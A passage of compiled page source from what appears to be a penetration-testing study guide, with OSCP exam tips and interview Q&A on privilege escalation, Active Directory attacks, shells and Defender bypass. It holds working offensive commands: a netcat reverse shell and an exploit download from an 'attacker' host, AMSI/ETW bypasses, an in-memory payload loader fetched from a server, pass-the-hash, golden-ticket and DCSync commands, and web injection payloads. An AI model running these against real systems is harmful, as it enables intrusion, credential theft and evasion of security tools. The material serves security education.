        children: "1. ENUMERATION IS EVERYTHING\n   ├── 80% of OSCP is good enumeration\n   ├── If stuck, re-enumerate with different tools\n   └── Check TCP AND UDP ports\n\n2. TIME MANAGEMENT\n   ├── 1 hour per machine: full port nmap + initial scanning\n   ├── Don't spend >4 hours on one machine\n   ├── AD set: attack as a chain, not isolated\n   └── Move on and come back\n\n3. COMMON VECTORS\n   ├── Web applications are worth exploring first\n   ├── File upload → webshell → reverse shell\n   ├── SQL injection → data extraction → credentials\n   └── Password reuse across services\n\n4. PRIVILEGE ESCALATION\n   ├── Run automated scripts early\n   ├── Linux: linpeas.sh shows most paths\n   ├── Windows: winpeas.exe / Service enumeration\n   └── Check sticky bits, sudo -l, cron jobs\n\n5. MACHINE TYPES\n   ├── Some machines require multi-step exploits\n   ├── Some have rabbit holes (ignore them)\n   ├── AD set follows realistic attack path\n   └── Buffer overflow is still tested\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-8-interview-corner",
      children: "Section 8: Interview Corner"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q1-what-is-the-difference-between-a-vulnerability-assessment-and-a-penetration-test",
      children: "Q1: What is the difference between a vulnerability assessment and a penetration test?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nA vulnerability assessment is an automated scan that identifies potential security weaknesses (CVEs, misconfigurations) without exploitation. It produces a list of findings but does not validate them. A penetration test is a manual, expert-led process that attempts to exploit vulnerabilities to prove real-world impact. The two key differences are:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Exploitation:"
        }), " Pentests exploit findings; vulnerability assessments do not"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Validation:"
        }), " Pentests eliminate false positives through manual verification; vulnerability assessments include false positives"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["Example: A vulnerability scan might report \"Apache 2.4.49 detected\" (and CVE-2021-41773 for path traversal). A pentest would try ", (0,jsx_runtime.jsx)(_components.code, {
        children: "curl http://target/cgi-bin/.%2e/%2e%2e/var/log/apache2/"
      }), " to prove it works and assess the impact."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q2-explain-the-cyber-kill-chain-and-how-it-maps-to-penetration-testing",
      children: "Q2: Explain the Cyber Kill Chain and how it maps to penetration testing."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nThe Cyber Kill Chain (Lockheed Martin) has 7 phases that map directly to pentesting phases:"]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Kill Chain Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Pentest Equivalent"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reconnaissance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Passive/Active Recon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OSINT, Shodan, Google dorking"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Weaponization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Payload preparation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "msfvenom, custom exploit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Delivery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Social engineering"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing email with payload"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exploitation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Gaining access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Metasploit module, SQL injection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Installation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Persistence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry run keys, cron job"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Command & Control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HTTPS beacon, DNS tunnel"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Actions on Objectives"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data exfiltration/impact"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Show proof.txt, demonstrate impact"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q3-how-would-you-escalate-privileges-on-a-linux-server-after-gaining-www-data-access",
      children: "Q3: How would you escalate privileges on a Linux server after gaining www-data access?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nMy escalation methodology follows this order:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Automated enumeration:"
        }), " Run ", (0,jsx_runtime.jsx)(_components.code, {
          children: "linpeas.sh"
        }), " or ", (0,jsx_runtime.jsx)(_components.code, {
          children: "linux-exploit-suggester.sh"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SUID binaries:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "find / -perm -4000 -type f 2>/dev/null"
        }), " — check GTFOBins for each"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Sudo privileges:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "sudo -l"
        }), " — check what the user can run as sudo"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cron jobs:"
        }), " Check ", (0,jsx_runtime.jsx)(_components.code, {
          children: "/etc/crontab"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "/var/spool/cron/*"
        }), " — writable scripts, wildcards"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Kernel exploits:"
        }), " Check kernel version against known exploits (DirtyPipe CVE-2022-0847, PwnKit CVE-2021-4034)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Writable /etc/passwd or /etc/shadow:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "ls -la /etc/passwd"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Capabilities:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "getcap -r / 2>/dev/null"
        }), " — look for exploitable capabilities"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "LXD/LXC groups:"
        }), " If user is in lxd group, container escape to host"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Example: For www-data on a box with CVE-2021-4034:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "www-data:~$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data:~$ ls -la /usr/bin/pkexec\n-rwsr-xr-x 1 root root 31056 Jan 15  2021 /usr/bin/pkexec\nwww-data:~$ wget http://attacker/exploit -O /tmp/exploit\nwww-data:~$ gcc /tmp/exploit.c -o /tmp/exploit\nwww-data:~$ /tmp/exploit\n# whoami\nroot\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q4-how-would-you-approach-a-windows-domain-controller-assessment",
      children: "Q4: How would you approach a Windows domain controller assessment?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nFor an AD environment, I follow this structured approach:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Initial Recon:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Port scan: DNS (53), Kerberos (88), RPC (135), NetBIOS (139), SMB (445), LDAP (389/636), RDP (3389)"
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["LDAP anonymous query: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "ldapsearch -x -h DC -b \"DC=domain,DC=com\""
            })]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["SMB enumeration: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "smbclient -L //DC -N"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "enum4linux -a DC"
            })]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Username Harvesting:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Kerbrute: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "./kerbrute userenum -d domain.com usernames.txt --dc DC"
            })]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["AS-REP roasting: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "impacket-GetNPUsers domain.com/ -usersfile users.txt"
            })]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["RID cycling: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "crackmapexec smb DC -u 'guest' -p '' --rid-brute"
            })]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Password Attacks:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Password spray: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "crackmapexec smb DC -u users.txt -p passwords.txt"
            })]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Kerberoasting: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "impacket-GetUserSPNs domain.com/username:password -request"
            })]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Post-Exploitation:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["BloodHound: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "SharpHound.exe -c All --domain domain.com"
            })]
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Analyze attack paths: shortest to Domain Admin"
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["DCSync: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "impacket-secretsdump domain.com/admin:password@DC"
            })]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Golden Ticket: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "mimikatz \"kerberos::golden /user:admin /domain:domain.com /sid:... /krbtgt:... /ptt\""
            })]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Lateral Movement:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "PSExec, WinRM, WMI, SMB exec via impacket"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Task scheduler, GPO deployment (for ransomware simulation)"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q5-explain-the-difference-between-a-reverse-shell-and-a-bind-shell-when-would-you-use-each",
      children: "Q5: Explain the difference between a reverse shell and a bind shell. When would you use each?"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Reverse shell:"
        }), " Target connects back to attacker (target is client, attacker is server). Used when target is behind NAT or firewall that blocks inbound connections. Command: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "nc -e /bin/sh attacker 4444"
        }), " with attacker running ", (0,jsx_runtime.jsx)(_components.code, {
          children: "nc -lvnp 4444"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Bind shell:"
        }), " Attacker connects directly to target (target is server, attacker is client). Used when target is directly reachable and listening on a vulnerable port. Command: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "nc -lvnp 4444 -e /bin/sh"
        }), " on target with attacker running ", (0,jsx_runtime.jsx)(_components.code, {
          children: "nc target 4444"
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Decision Matrix:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Scenario"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Best Choice"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Target behind NAT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reverse shell"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Firewall blocks outbound"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bind shell (if inbound allowed)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Egress filtering only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bind shell"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ingress filtering only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reverse shell"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Both filtered"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DNS tunneling or HTTP on allowed ports"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Need to bypass detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reverse shell on 443 (HTTPS)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q6-how-would-you-bypass-windows-defender-during-a-penetration-test",
      children: "Q6: How would you bypass Windows Defender during a penetration test?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nDefender bypass techniques are constantly evolving, but the following approaches work consistently:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Living off the Land (LOLBins):"
          }), " Use native Windows tools to avoid writing binaries"]
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "cscript.exe"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "wscript.exe"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "mshta.exe"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "rundll32.exe"
            })]
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "PowerShell without powershell.exe: Unmanaged PowerShell via C#"
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["WMI: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "wmic process call create \"cmd.exe /c command\""
            })]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Process Injection:"
          }), " Inject shellcode into legitimate processes"]
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "CreateRemoteThread, NtCreateThreadEx"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "APC injection (QueueUserAPC)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Process hollowing"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Obfuscation:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "PowerShell: Base64 encode, string splitting, variable substitution"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "C#: ConfuserEx, Obfuscar"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Python: pyarmor, py2exe + packing"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Alternative Techniques:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Execute-assembly (Cobalt Strike/Sliver) — runs .NET in-memory"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Reflective DLL injection — no on-disk footprint"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Office macro with PowerShell cradle"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Example PowerShell bypass:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# AMSI bypass\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# ETW bypass (C# — compile to exe)\n[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($EventProvider,0)\n\n# XOR-encrypted payload decrypted in memory\n$bytes = (Invoke-WebRequest \"http://server/payload.enc\").Content\n$key = 0xAB\nfor($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }\n$assembly = [System.Reflection.Assembly]::Load($bytes)\n$assembly.EntryPoint.Invoke($null, @(,[string[]]@()))\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q7-what-is-pass-the-hash-and-how-does-it-work",
      children: "Q7: What is pass-the-hash and how does it work?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nPass-the-Hash (PtH) is a lateral movement technique where an attacker uses NTLM password hashes (not plaintext passwords) to authenticate to Windows systems. It works because NTLM authentication uses the hash directly as the credential — no plaintext password is needed."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "How it works:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Attacker extracts NTLM hash from LSASS (e.g., ", (0,jsx_runtime.jsx)(_components.code, {
          children: "fc525c9683e8fe067095ba2ddc971889"
        }), ")"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Uses hash to authenticate via SMB, WMI, WinRM, or RDP (RDP requires additional steps)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Target server validates the hash against its SAM or domain controller"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tools:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# CrackMapExec (pass-the-hash)\ncrackmapexec smb 192.168.1.0/24 -u administrator -H fc525c9683e8fe067095ba2ddc971889\n\n# impacket psexec with hash\nimpacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.1.10\n\n# Mimikatz pass-the-hash\nmimikatz \"privilege::debug\" \"sekurlsa::pth /user:admin /domain:acme /ntlm:fc525c9683e8fe067095ba2ddc971889\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Mitigation:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Enable Windows Defender Credential Guard (virtualizes LSASS)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Restrict local admin token via Group Policy"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Implement Microsoft LAPS (different local admin password per machine)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use Protected Users group (disables NTLM authentication)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Deploy tiered administrative model"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q8-what-is-your-methodology-for-web-application-penetration-testing",
      children: "Q8: What is your methodology for web application penetration testing?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), "\nMy web app testing methodology follows OWASP Testing Guide v4/v5:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Information Gathering:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Wappalyzer/BuiltWith for tech stack detection"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "robots.txt, sitemap.xml, .well-known/"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Wayback Machine for historical endpoints"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Directory busting: gobuster, ffuf"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Authentication Testing:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Test for default credentials, username enumeration"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Login bypass (SQLi, NoSQLi, LDAP injection)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Session fixation, weak session tokens"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Rate limiting, account lockout testing"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Authorization Testing:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "IDOR: change parameter values (GET /user?id=1 → id=2)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Privilege escalation: repeat admin actions as user"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "JWT manipulation: change algorithm to none, tamper payload"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Input Validation:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["XSS: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "<script>"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "<img onerror>"
            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
              children: "javascript:alert(1)"
            })]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["SQL injection: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "' OR '1'='1"
            }), ", time-based, union-based"]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["SSRF: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "http://169.254.169.254/latest/meta-data/"
            })]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["LFI: ", (0,jsx_runtime.jsx)(_components.code, {
              children: "../../../etc/passwd"
            }), ", PHP wrappers"]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Business Logic:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Workflow bypass (skip payment step)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Race conditions (time-of-check/time-of-use)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Parameter tampering (price in hidden field)"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "API Testing:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Rate limiting, mass assignment"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Broken object property level authorization (BOPLA)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "GraphQL injection, depth attacks"
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Reporting:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "CVSS scoring for each finding"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Proof of concept with reproduction steps"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Remediation guidance with code examples"
          }), "\n"]
